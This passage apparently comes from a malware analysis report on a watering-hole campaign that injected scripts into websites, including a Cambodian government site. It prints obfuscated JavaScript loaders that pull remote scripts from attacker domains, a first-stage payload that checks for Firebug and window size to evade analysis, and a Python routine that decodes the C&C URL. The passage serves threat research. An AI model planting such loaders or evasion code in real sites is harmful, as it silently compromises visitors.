class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-r">arguments</span><span class="crayon-sy">[</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">'ip.'</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">'info/images/cdn.js?from=maxcdn'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152870752428981-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">getElementsByTagName</span><span class="crayon-sy">(</span><span class="crayon-s">'body'</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">.</span><span class="crayon-e">appendChild</span><span class="crayon-sy">(</span><span class="crayon-v">l</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152870752428981-6"><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">(</span><span class="crayon-s">'web'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'link'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'.self'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0003 seconds] -->
<p><em>Figure 2 – Piece of JavaScript code added to mfaic.gov[.]kh</em></p>
<p>In order to evade detection, they take the following measures:</p>
<ul>
<li>They obfuscate the scripts to prevent static extraction of the final URL.</li>
<li>The URL looks like a real JavaScript library used by the website.</li>
<li>They use one different domain and URI per compromised website.</li>
<li>The script is different per compromised website. The following piece of code is the script inserted into another compromised website:</li>
</ul>
<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bc152878236628938" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var script = document.createElement("script");
var i = 'crash-course';
var s = "fzgbc knowsztall znfo";
var _ = '/';
var e = "VisitorIdentification.js?sa=" + i;
script.async = true;
script.src = "htt" + "ps:" + _ + _ + s.split(" ").map(x =&gt; x.replace("z", "i")).join(".") + _ + e;
var doc = document.getElementsByTagName('script')[0];
doc.parentNode.insertBefore(script, doc);</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bc152878236628938-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152878236628938-2">2</div><div class="crayon-num" data-line="crayon-60581bc152878236628938-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152878236628938-4">4</div><div class="crayon-num" data-line="crayon-60581bc152878236628938-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152878236628938-6">6</div><div class="crayon-num" data-line="crayon-60581bc152878236628938-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc152878236628938-8">8</div><div class="crayon-num" data-line="crayon-60581bc152878236628938-9">9</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bc152878236628938-1"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">script</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">createElement</span><span class="crayon-sy">(</span><span class="crayon-s">"script"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152878236628938-2"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'crash-course'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152878236628938-3"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"fzgbc knowsztall znfo"</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152878236628938-4"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">_</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'/'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152878236628938-5"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-e ">e</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"VisitorIdentification.js?sa="</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">i</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152878236628938-6"><span class="crayon-v">script</span><span class="crayon-sy">.</span><span class="crayon-v">async</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">true</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152878236628938-7"><span class="crayon-v">script</span><span class="crayon-sy">.</span><span class="crayon-e ">src</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">"htt"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-s">"ps:"</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">s</span><span class="crayon-sy">.</span><span class="crayon-e">split</span><span class="crayon-sy">(</span><span class="crayon-s">" "</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">map</span><span class="crayon-sy">(</span><span class="crayon-v">x</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-v">x</span><span class="crayon-sy">.</span><span class="crayon-e">replace</span><span class="crayon-sy">(</span><span class="crayon-s">"z"</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">"i"</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">join</span><span class="crayon-sy">(</span><span class="crayon-s">"."</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">_</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc152878236628938-8"><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">document</span><span class="crayon-sy">.</span><span class="crayon-e">getElementsByTagName</span><span class="crayon-sy">(</span><span class="crayon-s">'script'</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">0</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc152878236628938-9"><span class="crayon-v">doc</span><span class="crayon-sy">.</span><span class="crayon-v">parentNode</span><span class="crayon-sy">.</span><span class="crayon-e">insertBefore</span><span class="crayon-sy">(</span><span class="crayon-v">script</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">doc</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0005 seconds] -->
<p><em>Figure 3 &#8211; Another piece of JavaScript inserted in a targeted website</em></p>
<h2>First stage</h2>
<p>Depending on the location of the IP address of the visitor, the first stage server, e.g. <span style="font-family: courier new, courier, monospace">weblink.selfip[.]info for mfaic.gov[.]kh</span>, delivers either a decoy script (a random legitimate JavaScript library) or the first stage script (SHA-1: 2194271C7991D60AE82436129D7F25C0A689050A for example). Not all the servers have a location check but when it is enabled, only visitors from Vietnam and Cambodia actually receive the malicious script.</p>
<p>The first stage script contains several checks to evade detection, as shown in Figure 4.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bc15287a093257309" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
[…]
function t(n) {
    var r = this;
    !function (t, n) {
        if (!(t instanceof n))
            throw new TypeError('Cannot call a class as a function');
    }(this, t), this.t = {
        o: null,
        s: !0
    }, this.scr = !0, this.r(), this.i = !0, window.addEventListener('scroll', function () {
        r.i || r.scr &amp;&amp; !r.t.s &amp;&amp; (r.scr = !1, r.c(n)), r.i = !1;
    });
}
return t.prototype.r = function () {
    var t = this;
    setInterval(function () {
        var n = window.outerWidth - window.innerWidth &gt; 160, r = window.outerHeight - window.innerHeight &gt; 160, e = n ? 'vertical' : 'horizontal';
        r &amp;&amp; n || !(window.Firebug &amp;&amp; window.Firebug.chrome &amp;&amp; window.Firebug.chrome.isInitialized || n || r) ? (t.t.s = !1, t.t.o = null) : (t.t.s = !0, t.t.o = e);
    }, 500);
}
 […]</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bc15287a093257309-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-2">2</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-4">4</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-6">6</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-8">8</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-10">10</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-12">12</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-14">14</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-16">16</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-18">18</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287a093257309-20">20</div><div class="crayon-num" data-line="crayon-60581bc15287a093257309-21">21</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60581bc15287a093257309-1"><span class="crayon-sy">[</span>…<span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-2"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">t</span><span class="crayon-sy">(</span><span class="crayon-v">n</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">!</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">t</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-i">t</span><span class="crayon-h"> </span><span class="crayon-r">instanceof</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-st">throw</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">TypeError</span><span class="crayon-sy">(</span><span class="crayon-s">'Cannot call a class as a function'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">(</span><span class="crayon-r">this</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">t</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">o</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">,</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">0</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">scr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-e">r</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">.</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-e">addEventListener</span><span class="crayon-sy">(</span><span class="crayon-s">'scroll'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-v">scr</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-v">scr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-e">c</span><span class="crayon-sy">(</span><span class="crayon-v">n</span><span class="crayon-sy">)</span><span class="crayon-sy">)</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-sy">.</span><span class="crayon-v">i</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">1</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-12"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-13"><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-14"><span class="crayon-st">return</span><span class="crayon-h"> </span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">prototype</span><span class="crayon-sy">.</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-15"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">t</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">this</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-16"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-r">setInterval</span><span class="crayon-sy">(</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-17"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">outerWidth</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">innerWidth</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">160</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">outerHeight</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">innerHeight</span><span class="crayon-h"> </span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-cn">160</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-i">n</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-s">'vertical'</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">'horizontal'</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-18"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">r</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-sy">(</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">Firebug</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">Firebug</span><span class="crayon-sy">.</span><span class="crayon-v">chrome</span><span class="crayon-h"> </span><span class="crayon-o">&amp;&amp;</span><span class="crayon-h"> </span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">Firebug</span><span class="crayon-sy">.</span><span class="crayon-v">chrome</span><span class="crayon-sy">.</span><span class="crayon-v">isInitialized</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-v">n</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-h"> </span><span class="crayon-v">r</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">?</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">1</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">o</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">s</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-o">!</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">t</span><span class="crayon-sy">.</span><span class="crayon-v">o</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">e</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-19"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">500</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60581bc15287a093257309-20"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-60581bc15287a093257309-21"><span class="crayon-h"> </span><span class="crayon-sy">[</span>…<span class="crayon-sy">]</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0012 seconds] -->
<p><em>Figure 4 &#8211; First stage JavaScript payload</em></p>
<p>The script will wait until the victim scrolls on the page. It also checks the resolution of the window and whether Firebug, a browser extension used to analyze webpages, is enabled. If either of the checks fails, it stops the execution.</p>
<p>Then, it decrypts the Command &amp; Control domain using a custom algorithm. For instance, <span style="font-family: courier new, courier, monospace">3B37371M1B1B382R332V1A382W36392W2T362T1A322T38</span> will be decrypted to <span style="font-family: courier new, courier, monospace">wss://tcog.thruhere[.]net</span>. For each first stage domain, the attackers also register a different second stage domain, each one being hosted on a different server. The code in Figure 5 is an equivalent, in Python, of the decryption function.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60581bc15287b994559909" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
def decrypt(encrypted_url):
	s = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
	return "".join(chr(s.index(encrypted_url[e]) * 36 + s.index(encrypted_url[e+1])) for e in range(0,len(encrypted_url),2))</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60581bc15287b994559909-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60581bc15287b994559909-2">2</div><div class="crayon-num" data-line="crayon-60581bc15287b994559909-3">3</div></div>
				</td>
